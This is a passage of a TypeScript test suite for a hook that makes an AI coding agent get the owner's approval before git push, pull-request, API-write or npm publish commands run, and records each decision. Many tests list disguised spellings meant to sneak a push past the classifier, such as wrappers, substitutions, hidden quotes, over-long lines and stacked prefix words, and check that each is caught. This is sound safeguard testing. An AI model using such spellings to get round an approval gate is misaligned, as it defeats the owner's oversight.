// Privileged shell forms at the hook (plan 04-19; FR-12, FR-14, S-4, S-7; threats T-04-50, T-04-52, T-04-53). The real hook entry runs as a child process against a
// temp ledger: a privileged form is named by its action, denied with the rule `privileged:<action>` and the command that approves it, and recorded as a
// `policy.denied` and an `approval.requested` event in the same transaction as the decision. No test calls a model.
import { after, describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { lstatSync, mkdirSync, readFileSync, readdirSync, realpathSync, rmSync, statSync, symlinkSync, utimesSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';

import { ATTENDED_HOOK_MARKER } from '../../src/adapters/host-claude/attended-hook-install.ts';
import { createDeps } from '../../src/cli/composition.ts';
import { paramsDigest } from '../../src/domain/approval.ts';
import { digestOf } from '../../src/domain/digest.ts';
import { classifyLine, classifyShellCommand } from '../../src/domain/privileged-commands.ts';
import { HOOK_ENTRY, PREAMBLE, budgetUsed, chainIsIntact, eventRows, makeHookFixture, runHook } from '../helpers/hook-fixture.ts';
import type { HookFixture } from '../helpers/hook-fixture.ts';
import { runMain } from '../helpers/decide-cli.ts';
import { PRODUCTION_ENTRY, makeRoots, runCli } from '../helpers/run-cli.ts';
import type { CliRoots } from '../helpers/run-cli.ts';
import { ledgerRows, profileEnv } from '../helpers/run-fixtures.ts';

const fixtures: HookFixture[] = [];
function fixture(options: Parameters<typeof makeHookFixture>[0] = {}): HookFixture {
  const fx = makeHookFixture(options);
  fixtures.push(fx);
  return fx;
}
after(() => {
  for (const fx of fixtures) rmSync(fx.dir, { recursive: true, force: true });
});

interface Deny {
  hookSpecificOutput: { hookEventName: string; permissionDecision: string; permissionDecisionReason: string };
}
const parsed = (stdout: string): Deny => JSON.parse(stdout) as Deny;
const dataOf = (row: { data_json: string }): Record<string, unknown> => JSON.parse(row.data_json) as Record<string, unknown>;
const bash = (command: string): { tool_name: string; tool_input: { command: string } } => ({ tool_name: 'Bash', tool_input: { command } });
// What an approval binds besides the options (plan 04-51; CR-03): the digest of the exact command text, and for an attended call the directory it runs in.
const lineDigest = (text: string): string => `sha256:${createHash('sha256').update(text).digest('hex').slice(0, 32)}`;

describe('the classification table (FR-12)', () => {
  // The action and the parameters that name the target and the options. The bindings that tie an approval to the rest of the command (`gitOptions`, `env`, `line`; plan
  // 04-51) are left out here and tested where they are defined, so the spellings of one push are still compared on what they push.
  const classes = (command: string): [string, Record<string, string>] | null => {
    const found = classifyLine(command);
    const first = found.kind === 'privileged' ? found.commands[0] : undefined;
    if (first === undefined) return null;
    const { line: _line, gitOptions: _gitOptions, env: _env, ...target } = first.params;
    return [first.action, target];
  };

  it('names git push by its remote and refspec, whatever way the command is spelled', () => {
    const expected: [string, Record<string, string>] = ['git.push', { remote: 'origin', refspec: 'main' }];
    for (const command of [
      'git push origin main',
      'git -C . push origin main',
      'git -C /tmp/x -c user.name=x push origin main',
      'git --no-pager push origin main',
      'git --git-dir=/tmp/x/.git push origin main',
      'env git push origin main',
      'env -i FOO=1 git push origin main',
      'FOO=1 BAR=2 git push origin main',
      '/usr/bin/git push origin main',
      'GIT push origin main',
      'command git push origin main',
      'sudo -u root git push origin main',
      "git 'push' origin main",
      'cd /tmp/x && git push origin main',
      'echo ok; git push origin main',
      'npm test || git push origin main',
      'echo done | git push origin main',
      'echo $(git push origin main)',
      'echo "$(git push origin main)"',
      'echo `git push origin main`',
      '(git push origin main)',
      '{ git push origin main; }',
      'if true; then git push origin main; fi',
    ]) {
      assert.deepEqual(classes(command), expected, command);
    }
    assert.deepEqual(classes('git push\nls'), ['git.push', {}]);
  });

  it('does not expect identical params across spellings: a spelling that changes the effect changes the params (CR-03)', () => {
    const full = (command: string): Record<string, string> => {
      const found = classifyLine(command);
      return found.kind === 'privileged' ? (found.commands[0]?.params as Record<string, string>) : {};
    };
    assert.notDeepEqual(full('git -C . push origin main'), full('git push origin main'));
    assert.notDeepEqual(full('FOO=1 git push origin main'), full('git push origin main'));
    assert.notDeepEqual(full('env git push origin main'), full('git push origin main'), 'the line differs');
  });

  it('binds the options a push changes its effect with, by name', () => {
    assert.deepEqual(classes('git push --force origin main'), ['git.push', { options: '--force', refspec: 'main', remote: 'origin' }]);
    assert.deepEqual(classes('git push -u --force-with-lease=main:abc origin main'), ['git.push', { options: '--force-with-lease -u', refspec: 'main', remote: 'origin' }]);
    assert.deepEqual(classes('git push -o ci.skip origin main'), ['git.push', { options: '-o', refspec: 'main', remote: 'origin' }]);
    assert.notDeepEqual(classes('git push origin main'), classes('git push --force origin main'));
  });

  it('names the gh forms, binding the target and leaving the title and body out', () => {
    assert.deepEqual(classes('gh pr create --title x --body y --base main --head feature'), ['scm.pr.create', { base: 'main', head: 'feature', options: '--body --title' }]);
    assert.deepEqual(classes('gh pr create -B main -H f -R o/r -t "a b"'), ['scm.pr.create', { base: 'main', head: 'f', options: '-t', repo: 'o/r' }]);
    assert.deepEqual(classes('gh pr merge 12 --squash --delete-branch'), ['scm.pr.merge', { options: '--delete-branch --squash', selector: '12' }]);
    assert.deepEqual(classes('gh pr edit 12 --add-label x --base dev'), ['scm.pr.update', { base: 'dev', options: '--add-label', selector: '12' }]);
    assert.deepEqual(classes('gh release create v1.2.0 --target main --notes hi'), ['release.publish', { options: '--notes', tag: 'v1.2.0', target: 'main' }]);
  });

  it('names gh api only for a method that is not GET, and treats a request with fields as the POST gh makes of it', () => {
    assert.deepEqual(classes('gh api repos/o/r/pulls -X POST'), ['scm.api.write', { endpoint: 'repos/o/r/pulls', method: 'POST' }]);
    assert.deepEqual(classes('gh api --method=DELETE repos/o/r/git/refs/heads/x'), ['scm.api.write', { endpoint: 'repos/o/r/git/refs/heads/x', method: 'DELETE' }]);
    assert.deepEqual(classes('gh api repos/o/r/issues -f title=x'), ['scm.api.write', { endpoint: 'repos/o/r/issues', method: 'POST', options: '-f' }]);
    assert.deepEqual(classes('gh api graphql -F query=@q.graphql'), ['scm.api.write', { endpoint: 'graphql', method: 'POST', options: '-F' }]);
    assert.deepEqual(classes('gh api repos/o/r/issues -X patch -f state=closed'), ['scm.api.write', { endpoint: 'repos/o/r/issues', method: 'PATCH', options: '-f' }]);
    assert.equal(classes('gh api repos/o/r/pulls'), null);
    assert.equal(classes('gh api -X GET repos/o/r/pulls'), null);
    assert.equal(classes('gh api repos/o/r/pulls --jq .[].number'), null);
  });

  it('names npm publish', () => {
    assert.deepEqual(classes('npm publish'), ['release.publish', {}]);
    assert.deepEqual(classes('npm --prefix pkg publish --access public --tag next'), ['release.publish', { access: 'public', options: '--prefix', tag: 'next' }]);
    assert.deepEqual(classes('npm publish ./pkg.tgz'), ['release.publish', { package: './pkg.tgz' }]);
  });

  it('does not name a command that only mentions a privileged form, or one that reads', () => {
    for (const command of [
      'gh pr view 12',
      'gh pr list',
      'gh issue view 3',
      'git status',
      'git log --grep push',
      'git stash push',
      'git commit -m "git push"',
      'git remote add push x',
      'echo "git push origin main"',
      "echo 'gh pr create'",
      'grep push file.txt',
      'cat gh',
      'npm test',
      'npm install publish',
      'npm view publish',
      'ls',
      '',
    ]) {
      assert.equal(classes(command), null, command);
    }
  });

  it('classifyShellCommand takes the words of one command', () => {
    assert.deepEqual(classifyShellCommand(['git', 'push', 'origin', 'main']), { action: 'git.push', params: { remote: 'origin', refspec: 'main' } });
    assert.equal(classifyShellCommand(['git', 'status']), null);
    assert.equal(classifyShellCommand([]), null);
  });
});

describe('tracer: in a run, gh pr create is denied as privileged with the approve hint and recorded (FR-12, S-7)', () => {
  const fx = fixture();
  const call = bash('gh pr create --title "x" --base main');
  let requestId = '';

  it('denies with rule privileged:scm.pr.create and a reason that names `avarice approve apr_...`', () => {
    const result = runHook(fx, 'pre', call);
    assert.equal(result.code, 0, result.stderr);
    const out = parsed(result.stdout);
    assert.equal(out.hookSpecificOutput.permissionDecision, 'deny');
    const reason = out.hookSpecificOutput.permissionDecisionReason;
    assert.match(reason, /^avarice: privileged:scm\.pr\.create: /);
    const named = /avarice approve (apr_[0-9A-Z]{26})/.exec(reason);
    assert.ok(named, reason);
    requestId = named[1] as string;
    assert.equal(budgetUsed(fx, 'toolCalls'), 0, 'a denied call is not charged');
  });

  it('records policy.denied and approval.requested beside the hook.decision, with the scope, the action and the digest of the parsed parameters', () => {
    const decisions = eventRows(fx, 'hook.decision').map(dataOf);
    assert.deepEqual(decisions.map((d) => [d['decision'], d['rule']]), [['deny', 'privileged:scm.pr.create']]);

    const requested = eventRows(fx, 'approval.requested');
    assert.equal(requested.length, 1);
    const [row] = requested;
    assert.ok(row);
    assert.equal(row.run_id, 'run_1');
    const data = dataOf(row);
    assert.equal(data['requestId'], requestId);
    assert.equal(data['scope'], 'run_1');
    assert.equal(data['action'], 'scm.pr.create');
    assert.equal(data['paramsDigest'], paramsDigest({ base: 'main', options: '--title', line: lineDigest('gh pr create --title "x" --base main') }));
    assert.equal(data['ruleId'], 'privileged:scm.pr.create');

    const denied = eventRows(fx, 'policy.denied');
    assert.equal(denied.length, 1);
    const [deniedRow] = denied;
    assert.ok(deniedRow);
    assert.equal(deniedRow.run_id, 'run_1');
    assert.equal(deniedRow.invocation_id, 'inv_1');
    const d = dataOf(deniedRow);
    assert.equal(d['ruleId'], 'privileged:scm.pr.create');
    assert.equal(d['action'], 'scm.pr.create');
    assert.equal(d['runId'], 'run_1');
    assert.equal(d['requestId'], requestId);
    assert.ok(chainIsIntact(fx.ledgerPath));
  });

  it('records no command text beyond the bounded target', () => {
    const all = eventRows(fx).map((r) => r.data_json).join('\n');
    assert.ok(!all.includes('gh pr create'), 'the command line is not an event field');
    assert.ok(!all.includes('--title "x"'), 'the title is not an event field');
  });

  it('a retry of the same call names the request that is still waiting and records no second request', () => {
    const again = runHook(fx, 'pre', call);
    assert.equal(again.code, 0, again.stderr);
    assert.ok(parsed(again.stdout).hookSpecificOutput.permissionDecisionReason.includes(`avarice approve ${requestId}`));
    assert.equal(eventRows(fx, 'approval.requested').length, 1);
    assert.equal(eventRows(fx, 'policy.denied').length, 2, 'every denial is recorded');
  });

  it('other parameters are another request', () => {
    const other = runHook(fx, 'pre', bash('gh pr create --base release'));
    const named = /avarice approve (apr_[0-9A-Z]{26})/.exec(parsed(other.stdout).hookSpecificOutput.permissionDecisionReason);
    assert.ok(named);
    assert.notEqual(named[1], requestId);
    assert.equal(eventRows(fx, 'approval.requested').length, 2);
  });
});

describe('a run keeps its prefix rules for what is not privileged (the existing rules are unchanged)', () => {
  const fx = fixture();

  it('gh pr view is still refused by the denied prefix, and git status is still allowed', () => {
    const view = runHook(fx, 'pre', bash('gh pr view 12'));
    assert.match(parsed(view.stdout).hookSpecificOutput.permissionDecisionReason, /shell-denied-prefix/);
    const status = runHook(fx, 'pre', bash('git status'));
    assert.equal(status.code, 0, status.stderr);
    assert.equal(status.stdout, '');
    assert.equal(eventRows(fx, 'approval.requested').length, 0);
    assert.equal(eventRows(fx, 'policy.denied').length, 0);
  });

  it('git push, in each spelling the hook parses, is the privileged action git.push', () => {
    for (const command of ['git push origin main', 'git -C . push origin main', 'env git push origin main']) {
      const result = runHook(fx, 'pre', bash(command));
      assert.equal(result.code, 0, result.stderr);
      assert.match(parsed(result.stdout).hookSpecificOutput.permissionDecisionReason, /^avarice: privileged:git\.push: /, command);
    }
  });

  it('a call that carries the GSD preamble and then a push is judged on the push', () => {
    const result = runHook(fx, 'pre', bash(`${PREAMBLE}\ngit push origin main`));
    assert.match(parsed(result.stdout).hookSpecificOutput.permissionDecisionReason, /privileged:git\.push/);
  });
});

// ---------------------------------------------------------------------------------------------------------
// Task 2: the attended hook and its installation
// ---------------------------------------------------------------------------------------------------------

const scratch: string[] = [];
after(() => {
  for (const dir of scratch) rmSync(dir, { recursive: true, force: true });
});

// A profile with its ledger created (the composition migrates it), and a Claude configuration directory beside it.
function profile(): { roots: CliRoots; claude: string; dataRoot: string } {
  const roots = makeRoots();
  scratch.push(roots.base);
  const composed = createDeps(profileEnv(roots));
  assert.ok(composed.ok, 'composition');
  composed.value.close();
  return { roots, claude: join(realpathSync(roots.base), 'claude'), dataRoot: roots.AVARICE_DATA_ROOT };
}

interface Attended {
  code: number | null;
  stdout: string;
  stderr: string;
}

// The real hook entry in attended mode: no policy file, the profile's data root, one hook input on standard input.
function attendedHook(dataRoot: string | null, input: unknown, extra: readonly string[] = ['--event', 'pre']): Attended {
  const args = ['--disable-warning=ExperimentalWarning', HOOK_ENTRY, ...extra, '--attended', ATTENDED_HOOK_MARKER, ...(dataRoot === null ? [] : ['--data-root', dataRoot])];
  const env = { ...process.env };
  delete env['NODE_TEST_CONTEXT'];
  const result = spawnSync(process.execPath, args, { input: typeof input === 'string' ? input : JSON.stringify(input), encoding: 'utf8', env, timeout: 30_000 });
  return { code: result.status, stdout: result.stdout, stderr: result.stderr };
}

const attendedCall = (command: string, session = 's1', cwd = '/tmp'): Record<string, unknown> => ({ session_id: session, hook_event_name: 'PreToolUse', cwd, tool_name: 'Bash', tool_input: { command } });

interface EventDb {
  seq: number;
  type: string;
  run_id: string | null;
  invocation_id: string | null;
  data_json: string;
}
const eventsOf = (roots: CliRoots, type: string): EventDb[] => ledgerRows<EventDb>(roots, 'SELECT seq, type, run_id, invocation_id, data_json FROM events WHERE type = ? ORDER BY seq', type);
interface ApprovalDb {
  approval_id: string;
  run_id: string;
  action: string;
  params_digest: string;
  consumed_at: string | null;
}
const approvalsOf = (roots: CliRoots): ApprovalDb[] => ledgerRows<ApprovalDb>(roots, 'SELECT * FROM approvals ORDER BY rowid');
const hintOf = (out: Attended): string => {
  const reason = parsed(out.stdout).hookSpecificOutput.permissionDecisionReason;
  const named = /avarice approve (apr_[0-9A-Z]{26})/.exec(reason);
  assert.ok(named, reason);
  return named[1] as string;
};

describe('attended mode: a privileged form is denied until the owner approves it, then allowed once (FR-12, S-4)', () => {
  const p = profile();
  const push = attendedCall('git push origin main');
  let requestId = '';

  it('allows a call that is not a privileged form, with no output and no event, and an Edit call the same', () => {
    const ls = attendedHook(p.dataRoot, attendedCall('ls'));
    assert.deepEqual([ls.code, ls.stdout], [0, ''], ls.stderr);
    const edit = attendedHook(p.dataRoot, { session_id: 's1', tool_name: 'Edit', tool_input: { file_path: '/tmp/x', old_string: 'a', new_string: 'b' } });
    assert.deepEqual([edit.code, edit.stdout], [0, ''], edit.stderr);
    const view = attendedHook(p.dataRoot, attendedCall('gh pr view 3'));
    assert.deepEqual([view.code, view.stdout], [0, ''], view.stderr);
    assert.equal(ledgerRows<{ n: number }>(p.roots, 'SELECT count(*) AS n FROM events')[0]?.n, 0);
  });

  it('denies git push in session s1 with the approve hint, and records a request whose scope is attended:s1 and which carries no run ID', () => {
    const denied = attendedHook(p.dataRoot, push);
    assert.equal(denied.code, 0, denied.stderr);
    assert.equal(parsed(denied.stdout).hookSpecificOutput.permissionDecision, 'deny');
    assert.match(parsed(denied.stdout).hookSpecificOutput.permissionDecisionReason, /^avarice: privileged:git\.push: /);
    requestId = hintOf(denied);
    const requested = eventsOf(p.roots, 'approval.requested');
    assert.equal(requested.length, 1);
    const row = requested[0] as EventDb;
    assert.equal(row.run_id, null);
    const data = JSON.parse(row.data_json) as Record<string, unknown>;
    assert.equal(data['scope'], 'attended:s1');
    assert.equal(data['action'], 'git.push');
    assert.equal(data['requestId'], requestId);
    assert.equal(data['paramsDigest'], paramsDigest({ remote: 'origin', refspec: 'main', line: lineDigest('git push origin main'), cwd: realpathSync('/tmp') }));
    assert.equal(eventsOf(p.roots, 'policy.denied').length, 1);
    assert.equal(approvalsOf(p.roots).length, 0);
  });

  it('a call in another session or with other parameters is not covered by an approval of this one', async () => {
    const ran = await runMain(p.roots, ['approve', requestId], { answers: ['y'] });
    assert.equal(ran.code, 0, ran.out + ran.err);
    const approval = approvalsOf(p.roots)[0] as ApprovalDb;
    assert.equal(approval.run_id, 'attended:s1');
    assert.equal(approval.action, 'git.push');

    const otherSession = attendedHook(p.dataRoot, attendedCall('git push origin main', 's2'));
    assert.equal(parsed(otherSession.stdout).hookSpecificOutput.permissionDecision, 'deny', 'scope is the session');
    const otherParams = attendedHook(p.dataRoot, attendedCall('git push --force origin main'));
    assert.equal(parsed(otherParams.stdout).hookSpecificOutput.permissionDecision, 'deny', 'the options are bound');
    const otherRef = attendedHook(p.dataRoot, attendedCall('git push origin other'));
    assert.equal(parsed(otherRef.stdout).hookSpecificOutput.permissionDecision, 'deny', 'the refspec is bound');
    assert.equal((approvalsOf(p.roots)[0] as ApprovalDb).consumed_at, null, 'none of them took the approval');
  });

  it('after approval the same call is allowed once: consumed_at is set, an action.started names the approval, and the third call is denied again', () => {
    const allowed = attendedHook(p.dataRoot, push);
    assert.deepEqual([allowed.code, allowed.stdout], [0, ''], allowed.stderr);
    const approval = approvalsOf(p.roots)[0] as ApprovalDb;
    assert.notEqual(approval.consumed_at, null);
    const started = eventsOf(p.roots, 'action.started');
    assert.equal(started.length, 1);
    const data = JSON.parse((started[0] as EventDb).data_json) as Record<string, unknown>;
    assert.equal(data['approvalId'], approval.approval_id);
    assert.equal(data['scope'], 'attended:s1');
    assert.equal(data['action'], 'git.push');
    assert.equal((started[0] as EventDb).run_id, null);

    const third = attendedHook(p.dataRoot, push);
    assert.equal(parsed(third.stdout).hookSpecificOutput.permissionDecision, 'deny');
    assert.equal(eventsOf(p.roots, 'action.started').length, 1, 'nothing started the third time');
  });

  it('a revoked approval is not consumed', async () => {
    const denied = attendedHook(p.dataRoot, attendedCall('gh pr create --base main'));
    const id = hintOf(denied);
    const ran = await runMain(p.roots, ['approve', id], { answers: ['y'] });
    assert.equal(ran.code, 0, ran.out + ran.err);
    const row = approvalsOf(p.roots).find((a) => a.action === 'scm.pr.create') as ApprovalDb;
    const revoked = await runMain(p.roots, ['approve', '--revoke', row.approval_id]);
    assert.equal(revoked.code, 0, revoked.out + revoked.err);
    const again = attendedHook(p.dataRoot, attendedCall('gh pr create --base main'));
    assert.equal(parsed(again.stdout).hookSpecificOutput.permissionDecision, 'deny');
  });

  it('an attended hook never refuses the owner a settings change or a post-call event', () => {
    const post = attendedHook(p.dataRoot, { session_id: 's1', tool_name: 'Bash', tool_input: { command: 'git push' } }, ['--event', 'post']);
    assert.deepEqual([post.code, post.stdout], [0, ''], post.stderr);
    const config = attendedHook(p.dataRoot, { session_id: 's1', source: 'user_settings' }, ['--event', 'config-change']);
    assert.deepEqual([config.code, config.stdout], [0, ''], config.stderr);
  });
});

describe('attended mode denies a line it cannot check instead of passing it silently (CR-01, FR-12, T-04-105)', () => {
  const p = profile();
  // The comment keeps the push a push; the line is longer than the classifier reads.
  const overLong = `git push origin main #${'x'.repeat(70_000 - 'git push origin main #'.length)}`;

  it('denies a Bash command of 70,000 characters with privileged:unparseable and names the limit', () => {
    assert.equal(overLong.length, 70_000);
    const denied = attendedHook(p.dataRoot, attendedCall(overLong));
    assert.equal(denied.code, 0, denied.stderr);
    assert.notEqual(denied.stdout, '', 'the hook printed no decision for a line it could not check');
    assert.equal(parsed(denied.stdout).hookSpecificOutput.permissionDecision, 'deny');
    const reason = parsed(denied.stdout).hookSpecificOutput.permissionDecisionReason;
    assert.match(reason, /^avarice: privileged:unparseable: /);
    assert.match(reason, /65,536/);
  });

  it('records one policy.denied for scope attended:s1, no approval request and no approval row, and no command text', () => {
    const denied = eventsOf(p.roots, 'policy.denied');
    assert.equal(denied.length, 1);
    const data = dataOf(denied[0] as EventDb);
    assert.equal(data['ruleId'], 'privileged:unparseable');
    assert.equal(data['scope'], 'attended:s1');
    assert.equal(eventsOf(p.roots, 'approval.requested').length, 0);
    assert.equal(approvalsOf(p.roots).length, 0);
    const text = (denied[0] as EventDb).data_json;
    assert.ok(!text.includes('git push') && !text.includes('xxxx'), 'the command is not an event field');
  });

  it('still opens no store for a command that is not privileged', () => {
    const none = attendedHook(join(p.roots.base, 'no-such-data'), attendedCall('ls'));
    assert.deepEqual([none.code, none.stdout], [0, '']);
  });

  it('in a run the same 70,000-character line is refused as shell-syntax (the run keeps its own 16,384-character check)', () => {
    const fx = fixture();
    const result = runHook(fx, 'pre', bash(overLong));
    assert.equal(result.code, 0, result.stderr);
    assert.match(parsed(result.stdout).hookSpecificOutput.permissionDecisionReason, /^avarice: shell-syntax: /);
  });
});

describe('a line with more prefix words than the classifier reads is refused, not passed (CR-01, FR-12)', () => {
  const p = profile();
  const seventeen = `${'command '.repeat(17)}git push origin main`;

  it('attended: denies 17 wrapper words before a push with privileged:unparseable and names the limit', () => {
    const denied = attendedHook(p.dataRoot, attendedCall(seventeen));
    assert.equal(denied.code, 0, denied.stderr);
    assert.notEqual(denied.stdout, '', 'the hook printed no decision for a line it could not check');
    const reason = parsed(denied.stdout).hookSpecificOutput.permissionDecisionReason;
    assert.match(reason, /^avarice: privileged:unparseable: /);
    assert.match(reason, /16/);
    assert.equal(eventsOf(p.roots, 'policy.denied').length, 1);
  });

  it('attended: a push behind 16 wrapper words is still the privileged action git.push', () => {
    const denied = attendedHook(p.dataRoot, attendedCall(`${'command '.repeat(16)}git push origin main`));
    assert.match(parsed(denied.stdout).hookSpecificOutput.permissionDecisionReason, /^avarice: privileged:git\.push: /);
  });

  it('in a run, a line with 17 prefix words is refused as shell-syntax', () => {
    const fx = fixture();
    const result = runHook(fx, 'pre', bash(seventeen));
    assert.equal(result.code, 0, result.stderr);
    assert.match(parsed(result.stdout).hookSpecificOutput.permissionDecisionReason, /^avarice: shell-syntax: /);
  });
});

describe('attended mode allows the owner a commit whose message is a here-document with apostrophes (CR-02, T-04-107)', () => {
  const p = profile();
  const commit = ['git commit -m "$(cat <<\'EOF\'', "Fix the planner's (scope) handling", "# what's next", 'we should git push later', 'EOF', ')"'].join('\n');

  it('prints nothing and records no event, because the line holds no privileged command', () => {
    const out = attendedHook(p.dataRoot, attendedCall(commit));
    assert.deepEqual([out.code, out.stdout], [0, ''], out.stderr);
    assert.equal(ledgerRows<{ n: number }>(p.roots, 'SELECT count(*) AS n FROM events')[0]?.n, 0);
  });

  it('denies a push hidden after a quoted `)` inside a substitution, with the approve hint (CR-02)', () => {
    const out = attendedHook(p.dataRoot, attendedCall('echo $(echo ")"; git push)'));
    assert.match(parsed(out.stdout).hookSpecificOutput.permissionDecisionReason, /^avarice: privileged:git\.push: /);
    hintOf(out);
    const inQuotes = attendedHook(p.dataRoot, attendedCall('echo "$(echo ")"; git push)"'));
    assert.match(parsed(inQuotes.stdout).hookSpecificOutput.permissionDecisionReason, /^avarice: privileged:git\.push: /);
  });
});

// Every request ID a denial names, in the order the reason names them.
const hintsOf = (out: Attended): string[] => [...parsed(out.stdout).hookSpecificOutput.permissionDecisionReason.matchAll(/avarice approve (apr_[0-9A-Z]{26})/g)].map((m) => m[1] as string);
const requestedActions = (roots: CliRoots): string[] => eventsOf(roots, 'approval.requested').map((row) => dataOf(row)['action'] as string);
const approve = async (roots: CliRoots, id: string): Promise<void> => {
  const ran = await runMain(roots, ['approve', id], { answers: ['y'] });
  assert.equal(ran.code, 0, ran.out + ran.err);
};

describe('tracer: in an attended session every privileged command of a line needs its own approval (CR-04, FR-12, FR-13, T-04-130)', () => {
  const p = profile();
  const line = attendedCall('true; git push origin main && npm publish');
  let requests: string[] = [];

  it('denies the line with one request for git.push and one for release.publish, git.push first, and one policy.denied for each', () => {
    const denied = attendedHook(p.dataRoot, line);
    assert.equal(denied.code, 0, denied.stderr);
    assert.equal(parsed(denied.stdout).hookSpecificOutput.permissionDecision, 'deny');
    requests = hintsOf(denied);
    assert.equal(requests.length, 2, parsed(denied.stdout).hookSpecificOutput.permissionDecisionReason);
    assert.deepEqual(requestedActions(p.roots), ['git.push', 'release.publish']);
    assert.deepEqual(
      eventsOf(p.roots, 'approval.requested').map((row) => dataOf(row)['requestId']),
      requests,
      'the reason names the requests in the order of the line',
    );
    assert.deepEqual(
      eventsOf(p.roots, 'policy.denied').map((row) => dataOf(row)['action']),
      ['git.push', 'release.publish'],
    );
    assert.match(parsed(denied.stdout).hookSpecificOutput.permissionDecisionReason, /^avarice: privileged:git\.push: /);
  });

  it('one approval of the push alone does not let the line run: it is denied again, the push approval stays unconsumed and the publish request is named again', async () => {
    await approve(p.roots, requests[0] as string);
    const again = attendedHook(p.dataRoot, line);
    assert.equal(again.code, 0, again.stderr);
    assert.equal(again.stdout === '' ? 'allow' : parsed(again.stdout).hookSpecificOutput.permissionDecision, 'deny', 'the line ran with one approval');
    const rows = approvalsOf(p.roots);
    assert.equal(rows.length, 1);
    assert.equal((rows[0] as ApprovalDb).action, 'git.push');
    assert.equal((rows[0] as ApprovalDb).consumed_at, null, 'the lone push approval was not spent');
    assert.deepEqual(hintsOf(again), [requests[1]], 'only the publish request is named, the one already waiting');
    assert.equal(eventsOf(p.roots, 'approval.requested').length, 2, 'no new request was minted');
    assert.equal(eventsOf(p.roots, 'action.started').length, 0);
  });

  it('after the owner approves both, the line is allowed once: both approvals are consumed and two action.started events name them', async () => {
    await approve(p.roots, requests[1] as string);
    const allowed = attendedHook(p.dataRoot, line);
    assert.deepEqual([allowed.code, allowed.stdout], [0, ''], allowed.stderr);
    const rows = approvalsOf(p.roots);
    assert.equal(rows.length, 2);
    assert.ok(rows.every((r) => r.consumed_at !== null));
    const started = eventsOf(p.roots, 'action.started').map((row) => dataOf(row));
    assert.deepEqual(started.map((d) => d['action']), ['git.push', 'release.publish']);
    assert.deepEqual(started.map((d) => d['approvalId']), rows.map((r) => r.approval_id));
  });

  it('a fourth submission is denied again with fresh requests', () => {
    const fourth = attendedHook(p.dataRoot, line);
    assert.equal(parsed(fourth.stdout).hookSpecificOutput.permissionDecision, 'deny');
    assert.equal(hintsOf(fourth).length, 2);
    assert.equal(eventsOf(p.roots, 'approval.requested').length, 4);
    assert.equal(eventsOf(p.roots, 'action.started').length, 2, 'nothing started the fourth time');
  });
});

describe('a line that names one command twice needs two approvals, and the oldest approval is spent first (CR-04, FR-13)', () => {
  const p = profile();
  const twice = attendedCall('git push origin main; git push origin main');
  const once = attendedCall('git push origin main');
  const outcome = (out: Attended): string => (out.stdout === '' ? 'allow' : parsed(out.stdout).hookSpecificOutput.permissionDecision);
  let first = '';

  it('denies the line, and one approval of the request named spends nothing: the line is denied again and a second request is named', async () => {
    const denied = attendedHook(p.dataRoot, twice);
    assert.equal(outcome(denied), 'deny');
    first = hintsOf(denied)[0] as string;
    await approve(p.roots, first);
    const again = attendedHook(p.dataRoot, twice);
    assert.equal(outcome(again), 'deny', 'one approval let a line run a command twice');
    const rows = approvalsOf(p.roots);
    assert.equal(rows.length, 1);
    assert.equal((rows[0] as ApprovalDb).consumed_at, null, 'the lone approval was not spent');
    assert.equal(eventsOf(p.roots, 'action.started').length, 0);
    const named = hintsOf(again);
    assert.equal(named.length, 1, 'only the command without an approval is named');
    assert.notEqual(named[0], first, 'the approved request is not named again');
  });

  it('after the second approval the line is allowed once and both approvals are consumed', async () => {
    await approve(p.roots, hintsOf(attendedHook(p.dataRoot, twice))[0] as string);
    const allowed = attendedHook(p.dataRoot, twice);
    assert.deepEqual([allowed.code, allowed.stdout], [0, ''], allowed.stderr);
    const rows = approvalsOf(p.roots);
    assert.equal(rows.length, 2);
    assert.ok(rows.every((r) => r.consumed_at !== null));
    assert.equal(eventsOf(p.roots, 'action.started').length, 2);
    assert.equal(outcome(attendedHook(p.dataRoot, twice)), 'deny', 'both were spent');
  });

  // An approval binds the whole line (plan 04-51; CR-03), so two approvals granted at different times are usable only by a line that is the same text: the first command of
  // `twice` takes the earlier of its two approvals and the second command the later, and the two action.started events name them in that order.
  it('with two usable approvals granted at different times, the first command takes the earlier and the second the later', async () => {
    const q = profile();
    const named = hintsOf(attendedHook(q.dataRoot, twice))[0] as string;
    await approve(q.roots, named);
    await approve(q.roots, hintsOf(attendedHook(q.dataRoot, twice))[0] as string);
    const before = approvalsOf(q.roots);
    assert.equal(before.length, 2);
    const [older, newer] = before as [ApprovalDb, ApprovalDb];
    assert.ok(before.every((r) => r.consumed_at === null));
    const lone = attendedHook(q.dataRoot, once);
    assert.equal(parsed(lone.stdout).hookSpecificOutput.permissionDecision, 'deny', 'the line is bound: the same command on another line does not take the approvals');
    assert.ok(approvalsOf(q.roots).every((r) => r.consumed_at === null));
    const allowed = attendedHook(q.dataRoot, twice);
    assert.deepEqual([allowed.code, allowed.stdout], [0, ''], allowed.stderr);
    const started = eventsOf(q.roots, 'action.started').map((row) => dataOf(row)['approvalId']);
    assert.deepEqual(started, [older.approval_id, newer.approval_id], 'the earlier approval was spent first');
  });
});

describe('the requests of a line are listed in the order its commands run (CR-04, SEC-6)', () => {
  const p = profile();

  it('names the pr create inside a substitution before the push that follows it, and records the requests in that order', () => {
    const denied = attendedHook(p.dataRoot, attendedCall('echo $(gh pr create --base main) && git push origin main'));
    assert.equal(parsed(denied.stdout).hookSpecificOutput.permissionDecision, 'deny');
    assert.deepEqual(requestedActions(p.roots), ['scm.pr.create', 'git.push']);
    assert.deepEqual(hintsOf(denied), eventsOf(p.roots, 'approval.requested').map((row) => dataOf(row)['requestId']));
    assert.match(parsed(denied.stdout).hookSpecificOutput.permissionDecisionReason, /^avarice: privileged:scm\.pr\.create: scm\.pr\.create needs .*; git\.push needs /);
    assert.equal(eventsOf(p.roots, 'policy.denied').length, 2);
  });
});

describe('in a run a compound line is denied with the rule of its first privileged command, unchanged (CR-04)', () => {
  it('denies true; git push origin main && npm publish as privileged:git.push and names one request', () => {
    const fx = fixture();
    const result = runHook(fx, 'pre', bash('true; git push origin main && npm publish'));
    assert.equal(result.code, 0, result.stderr);
    const reason = parsed(result.stdout).hookSpecificOutput.permissionDecisionReason;
    assert.match(reason, /^avarice: privileged:git\.push: /);
    assert.equal((reason.match(/avarice approve apr_/g) ?? []).length, 1);
